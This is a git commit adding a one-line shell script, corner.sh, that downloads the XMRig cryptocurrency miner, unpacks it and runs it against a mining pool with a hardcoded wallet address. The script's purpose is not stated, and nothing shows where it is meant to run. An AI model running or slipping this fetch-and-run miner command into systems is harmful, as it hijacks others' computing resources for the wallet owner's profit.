bbc8e9509aec746195749353985c1b68be77590a
JosuElBestia <79526041+JosuElBestia@users.noreply.github.com>
2022-11-07 14:41:16 +0100

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:49DpanWJDTgSrTUVGoigxo1zTm4GCDyQGggAAwAsxr337nxowTQpcgndULdKd6KXXHFU1zfNPEJFojTj73zqiYdU43eFZN7 -p x
